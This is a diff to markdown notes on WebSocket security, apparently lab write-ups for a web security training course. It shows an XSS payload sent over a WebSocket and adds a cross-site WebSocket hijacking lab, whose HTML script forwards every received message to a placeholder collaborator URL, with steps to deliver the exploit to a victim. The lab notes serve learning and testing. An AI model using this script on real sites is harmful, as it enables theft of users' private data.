@@ -83,6 +83,7 @@ The first step is determine if the WebSocket Handshake is protected against CSRF
 *You typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters*
 
 
+
 ```
 GET /chat HTTP/1.1
 Host: normal-website.com
@@ -126,5 +127,20 @@ If a WebSocket is vulnerable to CSRF, Then an attackers web page opens WebSocket
 4. Now as the WebSocket is connected send the following payload ```<img src=1 oNeRrOr=alert`1`>```
 
 
-
-
+####  Lab: Cross-site WebSocket hijacking 
+1. Check the live chat feature
+2. Now check the webstocket upgrade request, it does not have CSRF token 
+3. Now craft a CSRF request 
+  ```html
+    <script>
+      var ws = new WebSocket('wss://your-websocket-url');
+      ws.onopen = function() {
+          ws.send("READY");
+      };
+      ws.onmessage = function(event) {
+          fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
+      };
+  </script>
+```
+4. Store it to exploit server 
+5. Deliver the exploit to the victim 
